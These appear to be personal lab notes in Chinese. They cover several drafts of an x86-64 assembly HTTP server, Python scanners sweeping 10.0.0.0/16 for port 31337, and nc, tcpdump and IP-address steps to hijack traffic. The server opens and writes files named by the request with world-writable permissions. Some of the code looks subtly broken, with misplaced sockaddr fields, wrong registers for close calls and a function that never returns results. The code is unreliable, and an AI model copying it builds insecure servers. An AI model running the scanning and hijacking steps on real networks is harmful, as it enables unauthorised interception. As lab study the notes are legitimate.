<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line">.section .text</span><br><span class="line">_start:</span><br><span class="line">    mov rdi, 3</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 2</span><br><span class="line">    mov rsi, 1</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 41</span><br><span class="line">    syscall</span><br><span class="line">    sub rsp, 4</span><br><span class="line">    mov word ptr [rsp], 2</span><br><span class="line">    mov word ptr [rsp + 3], 80</span><br><span class="line">    mov dword ptr [rsp + 4], 0x00000000</span><br><span class="line">    push rsp</span><br><span class="line">    pop rsi</span><br><span class="line">    mov rdi, rax</span><br><span class="line">    mov rdx, 16</span><br><span class="line">    mov rax, 49</span><br><span class="line">    syscall</span><br><span class="line">    mov rdi, 3</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 50</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 3</span><br><span class="line">    xor rsi, rsi</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    //fork</span><br><span class="line">    mov rax, 57</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    // read</span><br><span class="line">    mov rdi, 4</span><br><span class="line">    push rsp</span><br><span class="line">    pop rsi</span><br><span class="line">    mov rdx, 10000</span><br><span class="line">    xor rax, rax</span><br><span class="line">    syscall</span><br><span class="line">    mov rcx, rsp</span><br><span class="line">    add rcx, 4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // open</span><br><span class="line">    sub rsp, 9</span><br><span class="line">    mov byte ptr [rsp], 0x2e</span><br><span class="line">    mov byte ptr [rsp + 1], 0x2f</span><br><span class="line">    mov byte ptr [rsp + 2], 0x65</span><br><span class="line">    mov byte ptr [rsp + 3], 0x78</span><br><span class="line">    mov byte ptr [rsp + 4], 0x70</span><br><span class="line">    mov byte ptr [rsp + 5], 0x2e</span><br><span class="line">    mov byte ptr [rsp + 6], 0x74</span><br><span class="line">    mov byte ptr [rsp + 7], 0x78</span><br><span class="line">    mov byte ptr [rsp + 8], 0x74</span><br><span class="line">    mov byte ptr [rsp + 9], 0x00</span><br><span class="line">    push rcx</span><br><span class="line">    mov byte ptr [rcx + 16], 0x00</span><br><span class="line">    pop rdi</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 2</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    // read</span><br><span class="line">    mov rdi, rax</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov rdx, 202</span><br><span class="line">    mov rax, 0</span><br><span class="line">    syscall</span><br><span class="line">    mov r8, rax</span><br><span class="line"></span><br><span class="line">    // close</span><br><span class="line">    mov rsi, 5</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    // write</span><br><span class="line">    mov rdi, 4</span><br><span class="line">    sub rsp, 24</span><br><span class="line">    mov dword ptr [rsp],     0x50545448</span><br><span class="line">    mov dword ptr [rsp + 4], 0x302e312f</span><br><span class="line">    mov dword ptr [rsp + 8], 0x30303220</span><br><span class="line">    mov dword ptr [rsp + 12], 0x0d4b4f20</span><br><span class="line">    mov qword ptr [rsp + 16], 0x000a0d0a</span><br><span class="line">    push rsp</span><br><span class="line">    pop rsi</span><br><span class="line">    mov rdx, 19</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line">    add rsp, 24</span><br><span class="line"></span><br><span class="line">    // write</span><br><span class="line">    mov rdi, 4</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov rdx, r8</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    // close</span><br><span class="line">    mov rdi, 4</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line">    // accept</span><br><span class="line">    mov rdi, 3</span><br><span class="line">    xor rsi, rsi</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line">.section .text</span><br><span class="line">_start:</span><br><span class="line">    mov rdi, 2</span><br><span class="line">    mov rsi, 1</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 41</span><br><span class="line">    syscall</span><br><span class="line">    sub rsp, 4</span><br><span class="line">    mov word ptr [rsp], 2</span><br><span class="line">    mov word ptr [rsp + 3], 80</span><br><span class="line">    mov dword ptr [rsp + 4], 0x00000000</span><br><span class="line">    push rsp</span><br><span class="line">    pop rsi</span><br><span class="line">    mov rdi, rax</span><br><span class="line">    mov rdx, 16</span><br><span class="line">    mov rax, 49</span><br><span class="line">    syscall</span><br><span class="line">    mov rdi, 3</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 50</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    // accept</span><br><span class="line">    mov rdi, 3</span><br><span class="line">    xor rsi, rsi</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line">    mov r8, rax</span><br><span class="line"></span><br><span class="line">    //fork</span><br><span class="line">    mov rax, 57</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    // close</span><br><span class="line">    mov rdi, r8</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    // accept</span><br><span class="line">    mov rdi, 3</span><br><span class="line">    xor rsi, rsi</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>循环开线程接包发包 get</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">========= Parent Process ==========</span><br><span class="line">[ ] execve(&lt;execve_args&gt;) = 0</span><br><span class="line">[ ] socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3</span><br><span class="line">[ ] bind(3, &#123;sa_family=AF_INET, sin_port=htons(&lt;bind_port&gt;), sin_addr=inet_addr(&quot;&lt;bind_address&gt;&quot;)&#125;, 16) = 0</span><br><span class="line">    - Bind to port 80</span><br><span class="line">    - Bind to address 0.0.0.0</span><br><span class="line">[ ] listen(3, 0) = 0</span><br><span class="line">[ ] accept(3, NULL, NULL) = 4</span><br><span class="line">[ ] fork() = &lt;fork_result&gt;</span><br><span class="line">[ ] close(4) = 0</span><br><span class="line">[ ] accept(3, NULL, NULL) = ?</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">========= Child Process ==========</span><br><span class="line">[ ] close(3) = 0</span><br><span class="line">[ ] read(4, &lt;read_request&gt;, &lt;read_request_count&gt;) = &lt;read_request_result&gt;</span><br><span class="line">[ ] open(&quot;&lt;open_path&gt;&quot;, O_RDONLY) = 3</span><br><span class="line">[ ] read(3, &lt;read_file&gt;, &lt;read_file_count&gt;) = &lt;read_file_result&gt;</span><br><span class="line">[ ] close(3) = 0</span><br><span class="line">[ ] write(4, &quot;HTTP/1.0 200 OK\r\n\r\n&quot;, 19) = 19</span><br><span class="line">[ ] write(4, &lt;write_file&gt;, &lt;write_file_count&gt;) = &lt;write_file_result&gt;</span><br><span class="line">[ ] exit(0) = ?</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line">.section .text</span><br><span class="line">_start:</span><br><span class="line">parent:</span><br><span class="line">    // socket</span><br><span class="line">    mov rdi, 2</span><br><span class="line">    mov rsi, 1</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 41</span><br><span class="line">    syscall</span><br><span class="line">    // bind</span><br><span class="line">    sub rsp, 4</span><br><span class="line">    mov word ptr [rsp], 2</span><br><span class="line">    mov word ptr [rsp + 3], 80</span><br><span class="line">    mov dword ptr [rsp + 4], 0x00000000</span><br><span class="line">    push rsp</span><br><span class="line">    pop rsi</span><br><span class="line">    mov rdi, rax</span><br><span class="line">    mov rdx, 16</span><br><span class="line">    mov rax, 49</span><br><span class="line">    syscall</span><br><span class="line">    // listen</span><br><span class="line">    mov rdi, 3</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 50</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    // accept</span><br><span class="line">    mov rdi, 3</span><br><span class="line">    xor rsi, rsi</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line">    mov r8, rax</span><br><span class="line"></span><br><span class="line">    //fork</span><br><span class="line">    mov rax, 57</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    cmp rax, 0</span><br><span class="line">    jz child</span><br><span class="line"></span><br><span class="line">    // close</span><br><span class="line">    mov rdi, 4</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line">    jmp parent</span><br><span class="line"></span><br><span class="line">    // accept</span><br><span class="line">    mov rdi, 3</span><br><span class="line">    xor rsi, rsi</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">child:</span><br><span class="line"></span><br><span class="line">    // close</span><br><span class="line">    mov rdi, 3</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // read</span><br><span class="line">    mov rdi, 4</span><br><span class="line">    push rsp</span><br><span class="line">    pop rsi</span><br><span class="line">    mov rdx, 10000</span><br><span class="line">    xor rax, rax</span><br><span class="line">    syscall</span><br><span class="line">    mov rcx, rsp</span><br><span class="line">    add rcx, 4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // open</span><br><span class="line">    sub rsp, 9</span><br><span class="line">    mov byte ptr [rsp], 0x2e</span><br><span class="line">    mov byte ptr [rsp + 1], 0x2f</span><br><span class="line">    mov byte ptr [rsp + 2], 0x65</span><br><span class="line">    mov byte ptr [rsp + 3], 0x78</span><br><span class="line">    mov byte ptr [rsp + 4], 0x70</span><br><span class="line">    mov byte ptr [rsp + 5], 0x2e</span><br><span class="line">    mov byte ptr [rsp + 6], 0x74</span><br><span class="line">    mov byte ptr [rsp + 7], 0x78</span><br><span class="line">    mov byte ptr [rsp + 8], 0x74</span><br><span class="line">    mov byte ptr [rsp + 9], 0x00</span><br><span class="line">    push rcx</span><br><span class="line">    mov byte ptr [rcx + 16], 0x00</span><br><span class="line">    pop rdi</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 2</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    // read</span><br><span class="line">    mov rdi, rax</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov rdx, 202</span><br><span class="line">    mov rax, 0</span><br><span class="line">    syscall</span><br><span class="line">    mov r8, rax</span><br><span class="line"></span><br><span class="line">    // close</span><br><span class="line">    mov rsi, 5</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    // write</span><br><span class="line">    mov rdi, 4</span><br><span class="line">    sub rsp, 24</span><br><span class="line">    mov dword ptr [rsp],     0x50545448</span><br><span class="line">    mov dword ptr [rsp + 4], 0x302e312f</span><br><span class="line">    mov dword ptr [rsp + 8], 0x30303220</span><br><span class="line">    mov dword ptr [rsp + 12], 0x0d4b4f20</span><br><span class="line">    mov qword ptr [rsp + 16], 0x000a0d0a</span><br><span class="line">    push rsp</span><br><span class="line">    pop rsi</span><br><span class="line">    mov rdx, 19</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line">    add rsp, 24</span><br><span class="line"></span><br><span class="line">    // write</span><br><span class="line">    mov rdi, 4</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov rdx, r8</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    // accept</span><br><span class="line">    mov rdi, 3</span><br><span class="line">    xor rsi, rsi</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>
<p>post 接收参数并写入文件</p>
<p><img loading="lazy" data-src="web%E5%85%A5%E9%97%A8%E6%93%8D%E4%BD%9C/image-20240415202715805.png" alt="image-20240415202715805"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line">.section .text</span><br><span class="line">_start:</span><br><span class="line">parent:</span><br><span class="line">    // socket</span><br><span class="line">    mov rdi, 2</span><br><span class="line">    mov rsi, 1</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 41</span><br><span class="line">    syscall</span><br><span class="line">    // bind</span><br><span class="line">    sub rsp, 4</span><br><span class="line">    mov word ptr [rsp], 2</span><br><span class="line">    mov word ptr [rsp + 3], 80</span><br><span class="line">    mov dword ptr [rsp + 4], 0x00000000</span><br><span class="line">    push rsp</span><br><span class="line">    pop rsi</span><br><span class="line">    mov rdi, rax</span><br><span class="line">    mov rdx, 16</span><br><span class="line">    mov rax, 49</span><br><span class="line">    syscall</span><br><span class="line">    // listen</span><br><span class="line">    mov rdi, 3</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 50</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    // accept</span><br><span class="line">    mov rdi, 3</span><br><span class="line">    xor rsi, rsi</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line">    mov r8, rax</span><br><span class="line"></span><br><span class="line">    //fork</span><br><span class="line">    mov rax, 57</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    cmp rax, 0</span><br><span class="line">    jz child</span><br><span class="line"></span><br><span class="line">    // close</span><br><span class="line">    mov rdi, 4</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    // accept</span><br><span class="line">    mov rdi, 3</span><br><span class="line">    xor rsi, rsi</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    jmp parent</span><br><span class="line"></span><br><span class="line">child:</span><br><span class="line">    // close</span><br><span class="line">    mov rdi, 3</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    // read</span><br><span class="line">    mov rdi, 4</span><br><span class="line">    push rsp</span><br><span class="line">    pop rsi</span><br><span class="line">    mov rdx, 10000</span><br><span class="line">    xor rax, rax</span><br><span class="line">    syscall</span><br><span class="line">    mov r9, rsp</span><br><span class="line">    add r9, 5</span><br><span class="line">    mov r8, rax</span><br><span class="line"></span><br><span class="line">    // open</span><br><span class="line">    sub rsp, 9</span><br><span class="line">    push r9</span><br><span class="line">    mov byte ptr [r9 + 16], 0x00</span><br><span class="line">    pop rdi</span><br><span class="line">    mov rsi, 65</span><br><span class="line">    // 这里是八进制......</span><br><span class="line">    mov rdx, 511</span><br><span class="line">    mov rax, 2</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    // write</span><br><span class="line">    mov rdi, rax</span><br><span class="line">    add r9, 178</span><br><span class="line">    mov rsi, r9    </span><br><span class="line">    mov rdx, r8</span><br><span class="line">    sub rdx, 183</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    // close</span><br><span class="line">    mov rsi, 3</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    // write</span><br><span class="line">    mov rdi, 4</span><br><span class="line">    sub rsp, 24</span><br><span class="line">    mov dword ptr [rsp],     0x50545448</span><br><span class="line">    mov dword ptr [rsp + 4], 0x302e312f</span><br><span class="line">    mov dword ptr [rsp + 8], 0x30303220</span><br><span class="line">    mov dword ptr [rsp + 12], 0x0d4b4f20</span><br><span class="line">    mov qword ptr [rsp + 16], 0x000a0d0a</span><br><span class="line">    push rsp</span><br><span class="line">    pop rsi</span><br><span class="line">    mov rdx, 19</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line">    add rsp, 24</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // exit</span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>
<p>最终版 orz，整合了前面几个操作支持 get、post</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.intel_syntax noprefix</span><br><span class="line">.globl _start</span><br><span class="line">.section .text</span><br><span class="line">_start:</span><br><span class="line">    // socket</span><br><span class="line">    mov rdi, 2</span><br><span class="line">    mov rsi, 1</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 41</span><br><span class="line">    syscall</span><br><span class="line">    mov rbx, rax</span><br><span class="line"></span><br><span class="line">    // bind</span><br><span class="line">    sub rsp, 4</span><br><span class="line">    mov word ptr [rsp], 2</span><br><span class="line">    mov word ptr [rsp + 3], 80</span><br><span class="line">    mov dword ptr [rsp + 4], 0x00000000</span><br><span class="line">    push rsp</span><br><span class="line">    pop rsi</span><br><span class="line">    mov rdi, rax</span><br><span class="line">    mov rdx, 16</span><br><span class="line">    mov rax, 49</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    // listen</span><br><span class="line">    mov rdi, rbx</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rax, 50</span><br><span class="line">    syscall</span><br><span class="line">parent:</span><br><span class="line">    // accept</span><br><span class="line">    mov rdi, rbx</span><br><span class="line">    xor rsi, rsi</span><br><span class="line">    xor rdx, rdx</span><br><span class="line">    mov rax, 43</span><br><span class="line">    syscall</span><br><span class="line">    mov r13, rax</span><br><span class="line"></span><br><span class="line">    //fork</span><br><span class="line">    mov rax, 57</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    cmp rax, 0</span><br><span class="line">    jz child</span><br><span class="line"></span><br><span class="line">    // close</span><br><span class="line">    mov rdi, r13</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line">    </span><br><span class="line">    // accept</span><br><span class="line">//    mov rdi, rbx</span><br><span class="line">//    xor rsi, rsi</span><br><span class="line">//    xor rdx, rdx</span><br><span class="line">//    mov rax, 43</span><br><span class="line">//    syscall</span><br><span class="line"></span><br><span class="line">    jmp parent</span><br><span class="line"></span><br><span class="line">child:</span><br><span class="line">    // close</span><br><span class="line">    mov rdi, rbx</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    // read</span><br><span class="line">    mov rdi, r13</span><br><span class="line">    push rsp</span><br><span class="line">    pop rsi</span><br><span class="line">    mov rdx, 10000</span><br><span class="line">    xor rax, rax</span><br><span class="line">    syscall</span><br><span class="line">    mov r15, rax</span><br><span class="line">    mov r14, rsp</span><br><span class="line"></span><br><span class="line">    // &#x27;P&#x27;</span><br><span class="line">    cmp byte ptr [r14], 80</span><br><span class="line">    jz post</span><br><span class="line"></span><br><span class="line">get:</span><br><span class="line">    // open</span><br><span class="line">    sub rsp, 9</span><br><span class="line">    add r14, 4</span><br><span class="line">    push r14</span><br><span class="line">    mov byte ptr [r14 + 16], 0x00</span><br><span class="line">    pop rdi</span><br><span class="line">    mov rsi, 0</span><br><span class="line">    mov rdx, 0</span><br><span class="line">    mov rax, 2</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    // read</span><br><span class="line">    mov rdi, rax</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov rdx, 10000</span><br><span class="line">    mov rax, 0</span><br><span class="line">    syscall</span><br><span class="line">    mov r12, rax</span><br><span class="line"></span><br><span class="line">    // close</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    // write</span><br><span class="line">    mov rdi, r13</span><br><span class="line">    sub rsp, 24</span><br><span class="line">    mov dword ptr [rsp],     0x50545448</span><br><span class="line">    mov dword ptr [rsp + 4], 0x302e312f</span><br><span class="line">    mov dword ptr [rsp + 8], 0x30303220</span><br><span class="line">    mov dword ptr [rsp + 12], 0x0d4b4f20</span><br><span class="line">    mov qword ptr [rsp + 16], 0x000a0d0a</span><br><span class="line">    push rsp</span><br><span class="line">    pop rsi</span><br><span class="line">    mov rdx, 19</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line">    add rsp, 24</span><br><span class="line"></span><br><span class="line">    // write</span><br><span class="line">    mov rdi, r13</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    mov rdx, r12</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">    add r14, 5</span><br><span class="line"></span><br><span class="line">    // open</span><br><span class="line">    sub rsp, 9</span><br><span class="line">    push r14</span><br><span class="line">    mov byte ptr [r14 + 16], 0x00</span><br><span class="line">    pop rdi</span><br><span class="line">    mov rsi, 65</span><br><span class="line">    // 这里是八进制......</span><br><span class="line">    mov rdx, 511</span><br><span class="line">    mov rax, 2</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    // write</span><br><span class="line">    mov rdi, rax</span><br><span class="line">    </span><br><span class="line">    mov rdx, r15</span><br><span class="line">    sub rdx, 183</span><br><span class="line">    cmp rdx, 99</span><br><span class="line">    jg addOne</span><br><span class="line"></span><br><span class="line">    add rdx, 1</span><br><span class="line">    sub r14, 1</span><br><span class="line">    </span><br><span class="line">addOne:</span><br><span class="line">    add r14, 178</span><br><span class="line">    mov rsi, r14</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    // close</span><br><span class="line">    mov rsi, rbx</span><br><span class="line">    mov rax, 3</span><br><span class="line">    syscall</span><br><span class="line"></span><br><span class="line">    // write</span><br><span class="line">    mov rdi, r13</span><br><span class="line">    sub rsp, 24</span><br><span class="line">    mov dword ptr [rsp],     0x50545448</span><br><span class="line">    mov dword ptr [rsp + 4], 0x302e312f</span><br><span class="line">    mov dword ptr [rsp + 8], 0x30303220</span><br><span class="line">    mov dword ptr [rsp + 12], 0x0d4b4f20</span><br><span class="line">    mov qword ptr [rsp + 16], 0x000a0d0a</span><br><span class="line">    push rsp</span><br><span class="line">    pop rsi</span><br><span class="line">    mov rdx, 19</span><br><span class="line">    mov rax, 1</span><br><span class="line">    syscall</span><br><span class="line">    add rsp, 24</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // exit</span><br><span class="line">    mov rdi, 0</span><br><span class="line">    mov rax, 60</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure>
<h3 id="nc-2"><a class="markdownIt-Anchor" href="#nc-2">#</a> nc</h3>
<p>连接</p>
<blockquote>
<p>nc 127.0.0.1 80</p>
</blockquote>
<p>接听</p>
<blockquote>
<p>nc -lp 80</p>
</blockquote>
<p>多线程扫描</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_port</span>(<span class="params">hostname, port</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;testing:<span class="subst">&#123;hostname&#125;</span>&#x27;</span>)</span><br><span class="line">        sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        sock.settimeout(<span class="number">2</span>)</span><br><span class="line">        result=sock.connect_ex((hostname,port))</span><br><span class="line">        <span class="keyword">if</span> (result == <span class="number">0</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;hostname&#125;</span>----------&#x27;</span>)</span><br><span class="line">        sock.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        t = threading.Thread(target=check_port,args=(<span class="string">f&#x27;10.0.0.<span class="subst">&#123;i&#125;</span>&#x27;</span>,<span class="number">31337</span>))</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Error: unable to start thread&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
<p>更好的多线程扫描</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ProcessPoolExecutor, as_completed</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置日志</span></span><br><span class="line">logging.basicConfig(filename=<span class="string">&#x27;port_check.log&#x27;</span>, level=logging.INFO, <span class="built_in">format</span>=<span class="string">&#x27;%(asctime)s - %(message)s&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_port</span>(<span class="params">hostname, port</span>):</span><br><span class="line">    <span class="comment"># print(hostname)</span></span><br><span class="line">    <span class="comment"># print(port)</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># logging.info(f&#x27;testing: &#123;hostname&#125;&#x27;)</span></span><br><span class="line">        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        sock.settimeout(<span class="number">2</span>)</span><br><span class="line">        result = sock.connect_ex((hostname, port))</span><br><span class="line">        <span class="keyword">if</span> result == <span class="number">0</span>:</span><br><span class="line">            logging.info(<span class="string">f&#x27;<span class="subst">&#123;hostname&#125;</span>----------&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        sock.close()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parallel_process</span>(<span class="params">array, function</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    A parallel version of the map function with a progress bar. </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Args:</span></span><br><span class="line"><span class="string">        array (array-like): An array to iterate over.</span></span><br><span class="line"><span class="string">        function (function): A python function to apply to the elements of array</span></span><br><span class="line"><span class="string">    Returns:</span></span><br><span class="line"><span class="string">        [function(array[0]), function(array[1]), ...]</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    n_jobs = <span class="number">512</span>  <span class="comment"># 线程数</span></span><br><span class="line">    <span class="keyword">with</span> ProcessPoolExecutor(max_workers=n_jobs) <span class="keyword">as</span> pool:</span><br><span class="line">        futures = [pool.submit(function, *a) <span class="keyword">for</span> a <span class="keyword">in</span> array]  <span class="comment"># 使用 *a 解包参数元组</span></span><br><span class="line">        kwargs = &#123;</span><br><span class="line">            <span class="string">&#x27;total&#x27;</span>: <span class="built_in">len</span>(futures),</span><br><span class="line">            <span class="string">&#x27;unit&#x27;</span>: <span class="string">&#x27;it&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;unit_scale&#x27;</span>: <span class="literal">True</span>,</span><br><span class="line">            <span class="string">&#x27;leave&#x27;</span>: <span class="literal">True</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment"># Print out the progress as tasks complete</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    array = [(<span class="string">f&#x27;10.0.<span class="subst">&#123;j&#125;</span>.<span class="subst">&#123;i&#125;</span>&#x27;</span>, <span class="number">31337</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>) <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)]  <span class="comment"># 构造参数数组</span></span><br><span class="line">    <span class="comment"># array = [(f&#x27;192.168.0.&#123;i&#125;&#x27;, 31337) for i in range(256)]</span></span><br><span class="line">    <span class="comment"># print(array)</span></span><br><span class="line">    res = parallel_process(array, check_port)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="tcpdump劫持"><a class="markdownIt-Anchor" href="#tcpdump劫持">#</a> tcpdump 劫持</h3>
<blockquote>
<p>tcpdump -i any port 31337 -w capture.pcap</p>
</blockquote>
<h3 id="hijack"><a class="markdownIt-Anchor" href="#hijack">#</a> hijack</h3>
<p>增加 ip 监听以获取包</p>
<p><a href="https://ubuntu.com/server/docs/configuring-networks">Configuring networks | Ubuntu</a></p>
<blockquote>
<p>ip addr add 10.0.0.2 dev eth0</p>
</blockquote>
<p>scapy 用法</p>
